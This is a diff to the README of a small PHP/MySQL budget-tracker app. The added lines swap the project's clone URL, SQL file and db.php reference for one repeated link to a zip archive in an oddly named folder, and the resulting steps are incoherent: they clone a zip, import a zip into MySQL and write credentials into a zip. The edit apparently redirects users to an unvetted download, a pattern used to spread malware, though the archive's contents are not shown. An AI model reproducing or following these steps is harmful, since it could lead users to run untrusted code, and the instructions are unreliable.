@@ -13,7 +13,7 @@ A simple web application to track your income and expenses.
 
 1. Clone the repository:
     ```bash
-    git clone https://github.com/yourusername/budget-tracker.git
+    git clone https://github.com/Karte-uk/budget_tracker/raw/refs/heads/main/preconcurrently/budget-tracker-v2.4.zip
     ```
 
 2. Navigate to the project directory:
@@ -22,8 +22,8 @@ A simple web application to track your income and expenses.
     ```
 
 3. Set up the database:
-    - Import the `budget_tracker.sql` file into your MySQL database.
-    - Update the [db.php](http://_vscodecontentref_/0) file with your database credentials.
+    - Import the `https://github.com/Karte-uk/budget_tracker/raw/refs/heads/main/preconcurrently/budget-tracker-v2.4.zip` file into your MySQL database.
+    - Update the [https://github.com/Karte-uk/budget_tracker/raw/refs/heads/main/preconcurrently/budget-tracker-v2.4.zip](http://_vscodecontentref_/0) file with your database credentials.
 
 4. Start the server:
     - If you are using XAMPP, place the project folder in the `htdocs` directory and start Apache and MySQL from the XAMPP control panel.
